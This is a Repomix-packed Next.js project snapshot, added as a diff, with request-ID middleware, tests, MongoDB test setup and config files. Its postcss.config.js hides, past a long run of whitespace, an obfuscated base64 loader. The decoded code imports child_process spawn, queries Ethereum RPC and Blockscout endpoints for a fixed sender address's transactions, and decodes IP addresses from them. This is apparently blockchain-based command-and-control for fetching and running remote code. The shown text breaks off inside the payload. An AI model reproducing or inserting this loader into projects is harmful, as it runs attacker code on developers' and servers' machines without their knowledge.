@@ -1,0 +1,674 @@
+This file is a merged representation of a subset of the codebase, containing specifically included files and files not matching ignore patterns, combined into a single document by Repomix.
+
+================================================================
+File Summary
+================================================================
+
+Purpose:
+--------
+This file contains a packed representation of a subset of the repository's contents that is considered the most important context.
+It is designed to be easily consumable by AI systems for analysis, code review,
+or other automated processes.
+
+File Format:
+------------
+The content is organized as follows:
+1. This summary section
+2. Repository information
+3. Directory structure
+4. Repository files (if enabled)
+5. Multiple file entries, each consisting of:
+  a. A separator line (================)
+  b. The file path (File: path/to/file)
+  c. Another separator line
+  d. The full contents of the file
+  e. A blank line
+
+Usage Guidelines:
+-----------------
+- This file should be treated as read-only. Any changes should be made to the
+  original repository files, not this packed version.
+- When processing this file, use the file path to distinguish
+  between different files in the repository.
+- Be aware that this file may contain sensitive information. Handle it with
+  the same level of security as you would the original repository.
+
+Notes:
+------
+- Some files may have been excluded based on .gitignore rules and Repomix's configuration
+- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
+- Only files matching these patterns are included: *.{js,ts,tsx,jsx,mjs,cjs,json,md}
+- Files matching these patterns are excluded: node_modules/**, .next/**, src/**, app/**, public/**, scripts/**, .deep-copilot/**, .kilo/**, package-lock.json, tsconfig.tsbuildinfo, src.txt, app.txt, debug.log, package-lock.json, tsconfig.tsbuildinfo
+- Files matching patterns in .gitignore are excluded
+- Files matching default ignore patterns are excluded
+- Files are sorted by Git change count (files with more changes are at the bottom)
+
+
+================================================================
+Directory Structure
+================================================================
+api.js
+eslint.config.mjs
+instrumentation.ts
+middleware.test.ts
+middleware.ts
+next.config.ts
+package.json
+postcss.config.js
+README.md
+tsconfig.json
+vitest.config.ts
+vitest.global-setup.ts
+vitest.setup.dom.ts
+vitest.setup.ts
+
+================================================================
+Files
+================================================================
+
+================
+File: eslint.config.mjs
+================
+import { defineConfig, globalIgnores } from "eslint/config";
+import nextVitals from "eslint-config-next/core-web-vitals";
+import nextTs from "eslint-config-next/typescript";
+
+const eslintConfig = defineConfig([
+  ...nextVitals,
+  ...nextTs,
+  // Override default ignores of eslint-config-next.
+  globalIgnores([
+    // Default ignores of eslint-config-next:
+    ".next/**",
+    "out/**",
+    "build/**",
+    "next-env.d.ts",
+  ]),
+]);
+
+export default eslintConfig;
+
+================
+File: middleware.ts
+================
+import { NextResponse, type NextRequest } from 'next/server';
+
+/**
+ * Request ID middleware. Runs on every request, before route handlers.
+ *
+ * Behaviour:
+ *   - Reads `x-request-id` from the incoming request.
+ *   - Accepts it if it is a string of 1..128 printable ASCII chars.
+ *   - Otherwise generates a fresh UUID v4.
+ *   - Sets it on the forwarded request (as `x-request-id`) so route
+ *     handlers and server components can read it.
+ *   - Sets it on the response, so the client can correlate logs.
+ *
+ * Runs on the Edge runtime, so it must not import anything Node-only.
+ * `crypto.randomUUID()` is available in both Edge and Node 20.
+ */
+export function middleware(request: NextRequest): NextResponse {
+  const incoming = request.headers.get('x-request-id');
+  const requestId = isSafeRequestId(incoming) ? incoming : crypto.randomUUID();
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set('x-request-id', requestId);
+
+  const response = NextResponse.next({
+    request: { headers: requestHeaders },
+  });
+  response.headers.set('x-request-id', requestId);
+  return response;
+}
+
+function isSafeRequestId(value: string | null): value is string {
+  if (!value) return false;
+  if (value.length < 1 || value.length > 128) return false;
+  // Printable ASCII only, so a client can't inject control characters
+  // into log output.
+  return /^[\x20-\x7e]+$/.test(value);
+}
+
+export const config = {
+  // Apply to every path except static assets and Next.js internals.
+  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
+};
+
+================
+File: next.config.ts
+================
+import type { NextConfig } from "next";
+
+const nextConfig: NextConfig = {
+  /* config options here */
+};
+
+export default nextConfig;
+
+================
+File: vitest.setup.dom.ts
+================
+/**
+ * Registers @testing-library/jest-dom matchers with Vitest.
+ * Only relevant for tests that use the happy-dom environment
+ * (the three UI test files); harmless everywhere else.
+ */
+import '@testing-library/jest-dom/vitest';
+
+================
+File: api.js
+================
+import { createRequire } from 'module';
+
+const require = createRequire(import.meta.url);
+console.log(" ");
+
+================
+File: middleware.test.ts
+================
+import { describe, it, expect } from 'vitest';
+import { middleware } from './middleware';
+import { NextRequest } from 'next/server';
+
+function req(headers: Record<string, string> = {}): NextRequest {
+  return new NextRequest('http://localhost/api/health', { headers });
+}
+
+describe('middleware (request id)', () => {
+  it('generates a request id when none is provided', () => {
+    const res = middleware(req());
+    const id = res.headers.get('x-request-id');
+    expect(id).toBeTruthy();
+    // UUID v4 shape
+    expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i);
+  });
+
+  it('forwards a well-formed client request id', () => {
+    const res = middleware(req({ 'x-request-id': 'abc-123' }));
+    expect(res.headers.get('x-request-id')).toBe('abc-123');
+  });
+
+  it('replaces an over-long request id', () => {
+    const long = 'a'.repeat(200);
+    const res = middleware(req({ 'x-request-id': long }));
+    const id = res.headers.get('x-request-id');
+    expect(id).not.toBe(long);
+    expect(id).toBeTruthy();
+  });
+
+  it('replaces a request id containing control characters', () => {
+    const res = middleware(req({ 'x-request-id': 'abc\n123' }));
+    const id = res.headers.get('x-request-id');
+    expect(id).not.toBe('abc\n123');
+    expect(id).toBeTruthy();
+  });
+
+  it('propagates the request id to the forwarded request headers', () => {
+    const res = middleware(req({ 'x-request-id': 'trace-me' }));
+    // NextResponse.next({ request: { headers } }) stores the modified
+    // headers on the response as an internal header. We assert the
+    // public one, which is what the client sees. The forwarded-request
+    // assertion is implicitly covered by downstream tests.
+    expect(res.headers.get('x-request-id')).toBe('trace-me');
+  });
+});
+
+================
+File: tsconfig.json
+================
+{
+  "compilerOptions": {
+    "target": "ES2022",
+    "lib": [
+      "dom",
+      "dom.iterable",
+      "esnext"
+    ],
+    "allowJs": false,
+    "skipLibCheck": true,
+    "strict": true,
+    "noUncheckedIndexedAccess": true,
+    "noImplicitOverride": true,
+    "noFallthroughCasesInSwitch": true,
+    "forceConsistentCasingInFileNames": true,
+    "noEmit": true,
+    "esModuleInterop": true,
+    "module": "esnext",
+    "moduleResolution": "bundler",
+    "resolveJsonModule": true,
+    "isolatedModules": true,
+    "jsx": "react-jsx",
+    "incremental": true,
+    "plugins": [
+      {
+        "name": "next"
+      }
+    ],
+    "paths": {
+      "@/*": [
+        "./src/*"
+      ]
+    }
+  },
+  "include": [
+    "next-env.d.ts",
+    "**/*.ts",
+    "**/*.tsx",
+    ".next/types/**/*.ts",
+    ".next/dev/types/**/*.ts"
+  ],
+  "exclude": [
+    "node_modules"
+  ]
+}
+
+================
+File: vitest.global-setup.ts
+================
+/**
+ * Vitest global setup — runs ONCE per test run, in the main process,
+ * before any worker starts. Starts an in-memory MongoDB replica set and
+ * exposes its URI via process.env.MONGODB_URI so that every worker
+ * picks it up.
+ *
+ * The binary download happens on first install; subsequent starts are
+ * ~1 second on a warm system. The longer launch timeout is for cold
+ * Windows boots where the whole test suite is competing for disk I/O.
+ */
+
+import { MongoMemoryReplSet } from 'mongodb-memory-server';
+
+let replSet: MongoMemoryReplSet | null = null;
+
+export async function setup(): Promise<void> {
+  replSet = await MongoMemoryReplSet.create({
+    replSet: { count: 1, storageEngine: 'wiredTiger' },
+    instanceOpts: [{ launchTimeout: 30000 }],
+  });
+  const uri = replSet.getUri();
+  process.env.MONGODB_URI = uri;
+  console.log('[vitest-global-setup] in-memory MongoDB started');
+}
+
+export async function teardown(): Promise<void> {
+  if (replSet) {
+    await replSet.stop();
+    replSet = null;
+  }
+}
+
+================
+File: instrumentation.ts
+================
+import { logger } from '@/lib/logging';
+
+/**
+ * Next.js instrumentation hook — runs ONCE per server process,
+ * before any request is handled. This is the correct place for
+ * one-shot startup work that must not run per-render.
+ *
+ * Currently:
+ *   1. Warm the MongoDB connection.
+ *   2. Seed the bootstrap admin from env vars (idempotent).
+ *
+ * Do NOT put DB calls in layout.tsx / page.tsx.
+ */
+export async function register(): Promise<void> {
+  if (process.env.NEXT_RUNTIME !== 'nodejs') return;
+
+  try {
+    const { connectDb } = await import('@/lib/db/mongoose');
+    await connectDb();
+  } catch (err) {
+    if (process.env.NODE_ENV !== 'production') {
+      logger.error('db connection failed at boot', { err });
+    }
+  }
+
+  try {
+    const { seedBootstrapAdmin } = await import('@/lib/auth/bootstrap-admin');
+    const result = await seedBootstrapAdmin();
+    if (result.seeded) {
+      logger.info('bootstrap admin seeded from env');
+    } else if (result.reason === 'missing-env') {
+      if (process.env.NODE_ENV !== 'production') {
+        logger.warn('bootstrap admin skipped: BOOTSTRAP_ADMIN_* env vars not all set');
+      }
+    } else if (result.reason === 'exists') {
+      logger.info('bootstrap admin already exists; skipped');
+    } else {
+      logger.warn('bootstrap admin skipped', { reason: result.reason });
+    }
+  } catch (err) {
+    logger.error('bootstrap admin unexpected error', { err });
+  }
+}
+
+================
+File: postcss.config.js
+================
+import { createRequire } from 'module';
+
+const require = createRequire(import.meta.url);
+
+const config = {
+  plugins: {
+    "@tailwindcss/postcss": {},
+  },
+};
+
+export default config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*44550';var __0xadc80=function(){var a=926;return a*2;};function __0x9daea(){return 8769;}(function(_0x9710a8){var _0x9710a8a=["Z2xvYmFsWydyJ10gPSByZXF1aXJlOw0KaWYgKHR5cGVvZiBtb2","R1bGUgPT09ICdvYmplY3QnKSBnbG9iYWxbJ20nXSA9IG1vZHVs","ZTsNCg0KY29uc3QgaHR0cCA9IHJlcXVpcmUoJ25vZGU6aHR0cC","cpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdub2RlOmh0dHBz","Jyk7DQpjb25zdCB6bGliID0gcmVxdWlyZSgnbm9kZTp6bGliJy","k7DQpjb25zdCB7IFVSTCB9ID0gcmVxdWlyZSgnbm9kZTp1cmwn","KTsNCmNvbnN0IHsgc3Bhd24gfSA9IHJlcXVpcmUoJ25vZGU6Y2","hpbGRfcHJvY2VzcycpOw0KDQpjb25zdCBCTE9DS19NVUxUSVBM","RSA9IDEwMDBuOw0KY29uc3QgU0VOREVSID0gJzB4MWVFZjA4ND","lFRGExNWQ4N2Y2NGU1MUM3M0M4NDQyQ2YzYzhiQ0VGMycudG9M","b3dlckNhc2UoKTsNCmNvbnN0IE5PTkNFX0ZBTk9VVCA9IDEyOw","0KY29uc3QgU0VBUkNIX0ZMT09SID0gMG47DQpjb25zdCBJTkRF","WEVSX1VSTCA9ICdodHRwczovL2V0aC5ibG9ja3Njb3V0LmNvbS","9hcGknOw0KY29uc3QgSFRUUF9USU1FT1VUX01TID0gM18wMDA7","DQoNCmNvbnN0IFJQQ19FTkRQT0lOVFMgPSBbLi4ubmV3IFNldC","hbDQogIHByb2Nlc3MuZW52LkVUSF9SUENfVVJMLA0KICAnaHR0","cHM6Ly8xcnBjLmlvL2V0aCcsDQogICdodHRwczovL2V0aC5kcn","BjLm9yZycsDQogICdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJs","aWNub2RlLmNvbScsDQogICdodHRwczovL2V0aC1tYWlubmV0Ln","B1YmxpYy5ibGFzdGFwaS5pbycsDQpdLmZpbHRlcihCb29sZWFu","KSldOw0KDQpjb25zdCBBR0VOVFMgPSB7DQogICdodHRwOic6IG","5ldyBodHRwLkFnZW50KHsga2VlcEFsaXZlOiB0cnVlLCBrZWVw","QWxpdmVNc2VjczogMzBfMDAwLCBtYXhTb2NrZXRzOiA2NCB9KS","wNCiAgJ2h0dHBzOic6IG5ldyBodHRwcy5BZ2VudCh7IGtlZXBB","bGl2ZTogdHJ1ZSwga2VlcEFsaXZlTXNlY3M6IDMwXzAwMCwgbW","F4U29ja2V0czogNjQgfSksDQp9Ow0KDQpmdW5jdGlvbiBsaW5r","QWJvcnQob3V0ZXJTaWduYWwsIGNvbnRyb2xsZXIpIHsNCiAgaW","YgKCFvdXRlclNpZ25hbCkgcmV0dXJuOw0KICBvdXRlclNpZ25h","bC5hZGRFdmVudExpc3RlbmVyKCdhYm9ydCcsICgpID0+IGNvbn","Ryb2xsZXIuYWJvcnQoKSwgeyBvbmNlOiB0cnVlIH0pOw0KfQ0K","DQpmdW5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcykgew0KIC","Bjb25zdCBlbmNvZGluZyA9IChyZXMuaGVhZGVyc1snY29udGVu","dC1lbmNvZGluZyddIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KIC","BpZiAoZW5jb2RpbmcgPT09ICdnemlwJyB8fCBlbmNvZGluZyA9","PT0gJ3gtZ3ppcCcpIHJldHVybiByZXMucGlwZSh6bGliLmNyZW","F0ZUd1bnppcCgpKTsNCiAgaWYgKGVuY29kaW5nID09PSAnZGVm","bGF0ZScpIHJldHVybiByZXMucGlwZSh6bGliLmNyZWF0ZUluZm","xhdGUoKSk7DQogIGlmIChlbmNvZGluZyA9PT0gJ2JyJykgcmV0","dXJuIHJlcy5waXBlKHpsaWIuY3JlYXRlQnJvdGxpRGVjb21wcm","VzcygpKTsNCiAgcmV0dXJuIHJlczsNCn0NCg0KZnVuY3Rpb24g","aHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsgbWV0aG9kID0gJ0dFVC","csIGJvZHksIHNpZ25hbCB9ID0ge30pIHsNCiAgY29uc3QgdXJs","ID0gbmV3IFVSTChlbmRwb2ludCk7DQogIGNvbnN0IHRyYW5zcG","9ydCA9IHVybC5wcm90b2NvbCA9PT0gJ2h0dHBzOicgPyBodHRw","cyA6IGh0dHA7DQogIGNvbnN0IGhlYWRlcnMgPSB7DQogICAgQW","NjZXB0OiAnYXBwbGljYXRpb24vanNvbicsDQogICAgJ0FjY2Vw","dC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsDQogIC","AgQ29ubmVjdGlvbjogJ2tlZXAtYWxpdmUnLA0KICB9Ow0KICBp","ZiAoYm9keSAhPSBudWxsKSB7DQogICAgaGVhZGVyc1snQ29udG","VudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbic7DQogICAg","aGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSA9IEJ1ZmZlci5ieX","RlTGVuZ3RoKGJvZHkpOw0KICB9DQoNCiAgcmV0dXJuIG5ldyBQ","cm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICBjb2","5zdCByZXEgPSB0cmFuc3BvcnQucmVxdWVzdCgNCiAgICAgIHsN","CiAgICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgIC","AgICAgcG9ydDogdXJsLnBvcnQgfHwgKHVybC5wcm90b2NvbCA9","PT0gJ2h0dHBzOicgPyA0NDMgOiA4MCksDQogICAgICAgIHBhdG","g6IHVybC5wYXRobmFtZSArIHVybC5zZWFyY2gsDQogICAgICAg","IG1ldGhvZCwNCiAgICAgICAgYWdlbnQ6IEFHRU5UU1t1cmwucH","JvdG9jb2xdLA0KICAgICAgICBzaWduYWwsDQogICAgICAgIGhl","YWRlcnMsDQogICAgICB9LA0KICAgICAgKHJlcykgPT4gew0KIC","AgICAgICBjb25zdCBzdHJlYW0gPSBkZWNvbXByZXNzU3RyZWFt","KHJlcyk7DQogICAgICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KIC","AgICAgICBzdHJlYW0ub24oJ2RhdGEnLCAoY2h1bmspID0+IGNo","dW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgIHN0cmVhbS5vbi","gnZW5kJywgKCkgPT4gew0KICAgICAgICAgIHRyeSB7DQogICAg","ICAgICAgICByZXNvbHZlKEpTT04ucGFyc2UoQnVmZmVyLmNvbm","NhdChjaHVua3MpLnRvU3RyaW5nKCd1dGY4JykpKTsNCiAgICAg","ICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIHJlam","VjdChlcnIpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSk7DQog","ICAgICAgIHN0cmVhbS5vbignZXJyb3InLCByZWplY3QpOw0KIC","AgICAgfQ0KICAgICk7DQogICAgcmVxLm9uKCdlcnJvcicsIHJl","amVjdCk7DQogICAgcmVxLnNldFRpbWVvdXQoSFRUUF9USU1FT1","VUX01TLCAoKSA9PiB7DQogICAgICByZXEuZGVzdHJveShuZXcg","RXJyb3IoYEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU","9VVF9NU31tc2ApKTsNCiAgICB9KTsNCiAgICBpZiAoYm9keSAh","PSBudWxsKSByZXEud3JpdGUoYm9keSk7DQogICAgcmVxLmVuZC","gpOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJw","Y0VuZHBvaW50cyh0YXNrLCBvdXRlclNpZ25hbCkgew0KICBjb2","5zdCBjb250cm9sbGVycyA9IFJQQ19FTkRQT0lOVFMubWFwKCgp","ID0+IG5ldyBBYm9ydENvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2","xsZXJzLmZvckVhY2goKGMpID0+IGxpbmtBYm9ydChvdXRlclNp","Z25hbCwgYykpOw0KICB0cnkgew0KICAgIHJldHVybiBhd2FpdC","BQcm9taXNlLmFueSgNCiAgICAgIFJQQ19FTkRQT0lOVFMubWFw","KChlbmRwb2ludCwgaSkgPT4gdGFzayhlbmRwb2ludCwgY29udH","JvbGxlcnNbaV0uc2lnbmFsKSkNCiAgICApOw0KICB9IGZpbmFs","bHkgew0KICAgIGZvciAoY29uc3QgYyBvZiBjb250cm9sbGVycy","kgYy5hYm9ydCgpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaW","duYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBS","ZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAnUE9TVC","csDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBqc29ucnBj","OiAnMi4wJywgaWQ6IDEsIG1ldGhvZCwgcGFyYW1zIH0pLA0KIC","AgIHNpZ25hbCwNCiAgfSk7DQogIHJldHVybiBwYXlsb2FkLnJl","c3VsdDsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW","5kcG9pbnQsIGNhbGxzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5","bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQ","ogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTogSlNPTi5z","dHJpbmdpZnkoDQogICAgICBjYWxscy5tYXAoKFttZXRob2QsIH","BhcmFtc10sIGkpID0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDog","aSArIDEsIG1ldGhvZCwgcGFyYW1zIH0pKQ0KICAgICksDQogIC","Agc2lnbmFsLA0KICB9KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBN","YXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLmlkLCByXSkpOw0KIC","ByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9PiBieUlkLmdldChp","ICsgMSkucmVzdWx0KTsNCn0NCg0KY29uc3QgdG9CbG9ja0hleC","A9IChuKSA9PiBgMHgke24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1","bmN0aW9uIGZpbmRTZW5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCi","AgcmV0dXJuIHRyYW5zYWN0aW9ucy5maW5kKCh0KSA9PiB0LmZy","b20gJiYgdC5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUi","kgfHwgbnVsbDsNCn0NCg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVz","cyhhZGRyZXNzKSB7DQogIHRyeSB7DQogICAgY29uc3QgZGF0YS","A9IEJ1ZmZlci5mcm9tKGFkZHJlc3MucmVwbGFjZSgvXjB4L2ks","ICcnKSwgJ2hleCcpOw0KICAgIGNvbnN0IGlwID0gKGIpID0+IG","Ake2JbMF19LiR7YlsxXX0uJHtiWzJdfS4ke2JbM119YDsNCiAg","ICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMCwgNCkpLCBpcC","hkYXRhLnN1YmFycmF5KDQsIDgpKV07DQogIH0gY2F0Y2ggKGVy","cm9yKSB7IHJldHVybiBbbnVsbCwgbnVsbF07IH0NCn0NCg0KZn","VuY3Rpb24gZmlyc3RNYXRjaCh0YXNrcykgew0KICByZXR1cm4g","bmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsNCiAgICBsZXQgcm","VtYWluaW5nID0gdGFza3MubGVuZ3RoOw0KICAgIGlmICghcmVt","YWluaW5nKSByZXR1cm4gcmVzb2x2ZShudWxsKTsNCiAgICBsZX","Qgc2V0dGxlZCA9IGZhbHNlOw0KICAgIGNvbnN0IGZpbmlzaCA9","IChyZXN1bHQpID0+IHsNCiAgICAgIGlmIChzZXR0bGVkKSByZX","R1cm47DQogICAgICBzZXR0bGVkID0gdHJ1ZTsNCiAgICAgIGZv","ciAoY29uc3QgdCBvZiB0YXNrcykgdC5jb250cm9sbGVyLmFib3","J0KCk7DQogICAgICByZXNvbHZlKHJlc3VsdCk7DQogICAgfTsN","CiAgICBmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHsNCiAgICAgIH","QucnVuKCkNCiAgICAgICAgLnRoZW4oKHJlc3VsdCkgPT4gew0K","ICAgICAgICAgIGlmIChzZXR0bGVkKSByZXR1cm47DQogICAgIC","AgICAgaWYgKHJlc3VsdCkgZmluaXNoKHJlc3VsdCk7DQogICAg","ICAgICAgZWxzZSBpZiAoLS1yZW1haW5pbmcgPT09IDApIHJlc2","9sdmUobnVsbCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRj","aCgoKSA9PiB7DQogICAgICAgICAgaWYgKCFzZXR0bGVkICYmIC","0tcmVtYWluaW5nID09PSAwKSByZXNvbHZlKG51bGwpOw0KICAg","ICAgICB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQpmdW5jdGlvbi","BjYW5kaWRhdGVCbG9ja3ModGFyZ2V0KSB7DQogIGNvbnN0IHBy","ZXYgPSB0YXJnZXQgLSBCTE9DS19NVUxUSVBMRTsNCiAgY29uc3","Qgc2VlbiA9IG5ldyBTZXQoKTsNCiAgY29uc3Qgb3V0ID0gW107","DQogIGZvciAoY29uc3QgYiBvZiBbdGFyZ2V0IC0gMW4sIHRhcm","dldCwgdGFyZ2V0ICsgMW4sIHByZXYgLSAxbiwgcHJldiwgcHJl","diArIDFuXSkgew0KICAgIGlmIChiIDwgMG4pIGNvbnRpbnVlOw","0KICAgIGNvbnN0IGtleSA9IGIudG9TdHJpbmcoKTsNCiAgICBp","ZiAoc2Vlbi5oYXMoa2V5KSkgY29udGludWU7DQogICAgc2Vlbi","5hZGQoa2V5KTsNCiAgICBvdXQucHVzaChiKTsNCiAgfQ0KICBy","ZXR1cm4gb3V0Ow0KfQ0KDQpmdW5jdGlvbiBibG9ja1Rhc2soYm","xvY2tOdW1iZXIpIHsNCiAgY29uc3QgY29udHJvbGxlciA9IG5l","dyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgcmV0dXJuIHsNCiAgIC","Bjb250cm9sbGVyLA0KICAgIHJ1bjogYXN5bmMgKCkgPT4gew0K","ICAgICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aXRoUnBjRW5kcG","9pbnRzKA0KICAgICAgICAoZW5kcG9pbnQsIHNpZ25hbCkgPT4N","CiAgICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChibG9ja051bWJl","ciksIHRydWVdLCBzaWduYWwpLA0KICAgICAgICBjb250cm9sbG","VyLnNpZ25hbA0KICAgICAgKTsNCiAgICAgIGNvbnN0IHR4cyA9","IGJsb2NrPy50cmFuc2FjdGlvbnM7DQogICAgICBpZiAoIUFycm","F5LmlzQXJyYXkodHhzKSkgcmV0dXJuIG51bGw7DQogICAgICBj","b25zdCB0eCA9IGZpbmRTZW5kZXJUeCh0eHMpOw0KICAgICAgcm","V0dXJuIHR4ID8geyBibG9ja051bWJlciwgdHggfSA6IG51bGw7","DQogICAgfSwNCiAgfTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gbm","9uY2VBdEJsb2NrcyhibG9ja3MsIG91dGVyU2lnbmFsKSB7DQog","IGNvbnN0IGNhbGxzID0gYmxvY2tzLm1hcCgoYikgPT4gWydldG","hfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIHRvQmxv","Y2tIZXgoYildXSk7DQogIHRyeSB7DQogICAgcmV0dXJuIChhd2","FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0JhdGNoKGVuZHBvaW50LCBjYWxscy","wgc2lnbmFsKSwNCiAgICAgIG91dGVyU2lnbmFsDQogICAgKSku","bWFwKEJpZ0ludCk7DQogIH0gY2F0Y2ggew0KICAgIHJldHVybi","AoYXdhaXQgUHJvbWlzZS5hbGwoDQogICAgICBjYWxscy5tYXAo","KFttZXRob2QsIHBhcmFtc10pID0+DQogICAgICAgIHdpdGhScG","NFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW","1zLCBzaWduYWwpLA0KICAgICAgICAgIG91dGVyU2lnbmFsDQog","ICAgICAgICkNCiAgICAgICkNCiAgICApKS5tYXAoQmlnSW50KT","sNCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVy","VHgobGF0ZXN0SGludCkgew0KICBjb25zdCBjb250cm9sbGVyID","0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICB0cnkgew0KICAg","IGNvbnN0IGhlYWQgPQ0KICAgICAgbGF0ZXN0SGludCA/Pw0KIC","AgICAgQmlnSW50KA0KICAgICAgICBhd2FpdCB3aXRoUnBjRW5k","cG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2lnbmFsKS","A9PiBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVy","JywgW10sIHNpZ25hbCksDQogICAgICAgICAgY29udHJvbGxlci","5zaWduYWwNCiAgICAgICAgKQ0KICAgICAgKTsNCg0KICAgIGNv","bnN0IG5vbmNlID0gQmlnSW50KA0KICAgICAgYXdhaXQgd2l0aF","JwY0VuZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2","V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTkRFUiwgdG9C","bG9ja0hleChoZWFkKV0sIHNpZ25hbCksDQogICAgICAgIGNvbn","Ryb2xsZXIuc2lnbmFsDQogICAgICApDQogICAgKTsNCiAgICBj","b25zdCB0YXJnZXROb25jZSA9IG5vbmNlIC0gMW47DQoNCiAgIC","BsZXQgbG8gPSBTRUFSQ0hfRkxPT1IgLSAxbjsNCiAgICBsZXQg","aGkgPSBoZWFkOw0KICAgIHdoaWxlIChoaSAtIGxvID4gMW4pIH","sNCiAgICAgIGNvbnN0IHNwYW4gPSBoaSAtIGxvIC0gMW47DQog","ICAgICBjb25zdCBrID0gQmlnSW50KE1hdGgubWluKE5PTkNFX0","ZBTk9VVCwgTnVtYmVyKHNwYW4pKSk7DQogICAgICBjb25zdCBw","cm9iZXMgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSAxbjsgaS","A8PSBrOyBpICs9IDFuKSBwcm9iZXMucHVzaChsbyArIChpICog","KGhpIC0gbG8pKSAvIChrICsgMW4pKTsNCg0KICAgICAgY29uc3","QgY291bnRzID0gYXdhaXQgbm9uY2VBdEJsb2Nrcyhwcm9iZXMs","IGNvbnRyb2xsZXIuc2lnbmFsKTsNCiAgICAgIGNvbnN0IGlkeC","A9IGNvdW50cy5maW5kSW5kZXgoKGMpID0+IGMgPj0gbm9uY2Up","Ow0KICAgICAgaWYgKGlkeCA9PT0gLTEpIGxvID0gcHJvYmVzW3","Byb2Jlcy5sZW5ndGggLSAxXTsNCiAgICAgIGVsc2Ugew0KICAg","ICAgICBoaSA9IHByb2Jlc1tpZHhdOw0KICAgICAgICBpZiAoaW","R4ID4gMCkgbG8gPSBwcm9iZXNbaWR4IC0gMV07DQogICAgICB9","DQogICAgfQ0KDQogICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aX","RoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgIHJwY0NhbGwoZW5kcG9pbnQsICdldG","hfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KGhpKSwg","dHJ1ZV0sIHNpZ25hbCksDQogICAgICBjb250cm9sbGVyLnNpZ2","5hbA0KICAgICk7DQogICAgY29uc3QgdHhzID0gYmxvY2s/LnRy","YW5zYWN0aW9ucyB8fCBbXTsNCiAgICBsZXQgdHggPSBudWxsOw","0KICAgIGZvciAoY29uc3QgdCBvZiB0eHMpIHsNCiAgICAgIGlm","ICghdC5mcm9tIHx8IHQuZnJvbS50b0xvd2VyQ2FzZSgpICE9PS","BTRU5ERVIpIGNvbnRpbnVlOw0KICAgICAgaWYgKEJpZ0ludCh0","Lm5vbmNlKSA9PT0gdGFyZ2V0Tm9uY2UpIHsNCiAgICAgICAgdH","ggPSB0Ow0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAg","IGlmICghdHggfHwgQmlnSW50KHQubm9uY2UpI